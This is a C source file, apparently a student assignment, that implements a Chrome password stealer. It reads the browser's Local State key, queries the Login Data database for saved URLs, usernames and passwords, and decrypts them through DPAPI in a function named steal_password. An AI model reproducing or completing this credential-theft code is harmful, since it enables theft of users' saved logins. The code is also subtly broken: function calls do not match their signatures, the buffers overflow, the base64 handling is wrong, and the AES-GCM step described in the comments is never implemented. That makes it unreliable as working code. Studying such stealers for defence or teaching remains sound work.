

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sqlite3.h>


// data blob class
// source: https://docs.microsoft.com/en-us/windows/win32/api/dpapi/ns-dpapi-data_blob
typedef struct _DATA_BLOB {
    DWORD cbData;
    BYTE *pbData;
} DATA_BLOB, *PDATA_BLOB;


// get data
void get_data(DATA_BLOB *blob_out, char *buffer) {
    DWORD cbData = blob_out->cbData;
    BYTE *pbData = blob_out->pbData;
    memcpy(buffer, pbData, cbData);
    LocalFree(pbData);
}

// decrypt the symmetric key using the DPAPI
// to decrype data from a file or stream using data protection
// 1) read the encrypted data from the file or stream
// 2) call the static CryptUnprotectData to decrypt the data
// while passing an array of bytes to decrypt and the data data protection scope
// source: https://learn.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection
// source: https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
// decrypt data
int decrypt_data_dpapi(char *encrypted_bytes, char *buffer) {
    DATA_BLOB blob_in, blob_entropy, blob_out;
    blob_in.cbData = strlen(encrypted_bytes);
    blob_in.pbData = encrypted_bytes;
    blob_entropy.cbData = 0;
    blob_entropy.pbData = NULL;
    if (CryptUnprotectData(&blob_in, NULL, &blob_entropy, NULL, NULL, NULL, &blob_out)) {
        get_data(&blob_out, buffer);
        return 0;
    }
    printf("[!] Decryption Failed");
    return -1;
}

// get local state where json file is located
// find path to the current user's AppData directory
int get_local_state(char *local_state_path, char *local_state) {
    FILE *fp;
    fp = fopen(local_state_path, "r");
    if (fp == NULL) {
        printf("[!] Local state file not found");
        return -1;
    }
    fread(local_state, 1, 1024, fp);
    fclose(fp);
    return 0;
}


// get encryption key
int get_encryption_key(char *b64_key, char *key) {
    char local_state[1024];
    char local_state_path[1024];
    char *p;
    int ret;

    sprintf(local_state_path, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", getenv("USERPROFILE"));
    ret = get_local_state(local_state_path, local_state);
    if (ret != 0) {
        return -1;
    }
    p = strstr(local_state, "encrypted_key");
    if (p == NULL) {
        printf("[!] Encrypted key not found");
        return -1;
    }
    p = strstr(p, "\"");
    if (p == NULL) {
        printf("[!] Encrypted key not found");
        return -1;
    }
    p++;
    while (*p != '\"') {
        *b64_key++ = *p++;
    }
    *b64_key = '\0';
    Base64DecodeA(b64_key, strlen(b64_key), key, 1024);
    return 0;
}

// get login db path
int get_login_db_path(char *login_db_path) {
    char local_state[1024];
    char local_state_path[1024];
    char *p;
    int ret;

    sprintf(local_state_path, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", getenv("USERPROFILE"));
    ret = get_local_state(local_state_path, local_state);
    if (ret != 0) {
        return -1;
    }
    p = strstr(local_state, "path");
    if (p == NULL) {
        printf("[!] Path not found");
        return -1;
    }
    p = strstr(p, "\"");
    if (p == NULL) {
        printf("[!] Path not found");
        return -1;
    }
    p++;
    while (*p != '\"') {
        *login_db_path++ = *p++;
    }
    *login_db_path = '\0';
    sprintf(login_db_path, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s", getenv("USERPROFILE"), login_db_path);
    return 0;
}


// get login db
int get_login_db(char *login_db_path, char *login_db) {
    sqlite3 *db;
    sqlite3_stmt *stmt;
    int ret;

    ret = sqlite3_open(login_db_path, &db);
    if (ret != SQLITE_OK) {
        printf("[!] Login DB not found");
        return -1;
    }
    ret = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &stmt, NULL);
    if (ret != SQLITE_OK) {
        printf("[!] Login DB not found");
        return -1;
    }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        sprintf(login_db, "%s|%s|%s", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1), sqlite3_column_text(stmt, 2));
        login_db += strlen(login_db);
        *login_db++ = '\n';
    }
    *login_db = '\0';
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return 0;
}


// decrypts data and returns byte string
int decrypt_password(char *password, char *key) {
    DATA_BLOB data_in;
    DATA_BLOB data_out;
    DATA_BLOB entropy;
    int ret;

    data_in.pbData = (BYTE *)password;
    data_in.cbData = strlen(password);
    entropy.pbData = (BYTE *)key;
    entropy.cbData = strlen(key);
    ret = CryptUnprotectData(&data_in, NULL, &entropy, NULL, NULL, 0, &data_out);
    if (ret == 0) {
        return -1;
    }
    memcpy(password, data_out.pbData, data_out.cbData);
    password[data_out.cbData] = '\0';
    return 0;
}

// Use the key to decrypt the fields stored for user's Passwords
// Each of those can be retrieved by executing an SQL query against the chrome DB, 
// retrieving the relevant values, and decrypting them. Note that the values are encrypted with AES-GCM, mode.

// Refer to the python script from lecture, but recall that the first 3 bytes correspond to the chrome version, 
// and should be omitted. The next 23 bytes are the IV, 
// and the final 16 bytes are the TAG/Message Authentication Code (referred to as a TAG by windows)

/*
def main():
    # get the encryption key from the registry
    # get the path to the login data file
    # get the login data
    # decrypt the passwords
*/
// main
int steal_password() {
    char key[1024];
    char login_db_path[1024];
    char login_db[1024];
    char *p;
    int ret;

    ret = get_encryption_key(key);
    if (ret != 0) {
        return -1;
    }
    ret = get_login_db_path(login_db_path);
    if (ret != 0) {
        return -1;
    }
    ret = get_login_db(login_db_path, login_db);
    if (ret != 0) {
        return -1;
    }
    p = login_db;
    while (*p != '\0') {
        char *url = p;
        char *username;
        char *password;
        char *next;

        p = strstr(p, "|");
        if (p == NULL) {
            break;
        }
        *p++ = '\0';
        username = p;
        p = strstr(p, "|");
        if (p == NULL) {
            break;
        }
        *p++ = '\0';
        password = p;
        p = strstr(p, "|");
        if (p == NULL) {
            break;
        }
        *p++ = '\0';
        next = p;
        ret = decrypt_password(password, key);
        if (ret != 0) {
            printf("[!] Failed to decrypt password");
            return -1;
        }
    }
    return 0;
}

